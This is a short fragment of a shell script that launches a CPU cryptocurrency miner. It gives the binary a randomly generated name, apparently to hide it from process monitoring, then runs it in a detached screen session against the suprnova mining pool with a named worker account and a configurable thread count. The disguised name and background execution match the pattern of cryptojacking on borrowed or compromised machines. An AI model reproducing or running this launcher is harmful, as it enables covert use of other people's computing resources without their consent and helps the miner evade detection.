...
a='nwmtjxvcxt-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
...
screen -d -m ./"${cpuname}" -a argon2d-dyn -o stratum+tcp://dyn.suprnova.cc:5960 -u luanbuifx.1 -p x -t $maxcore
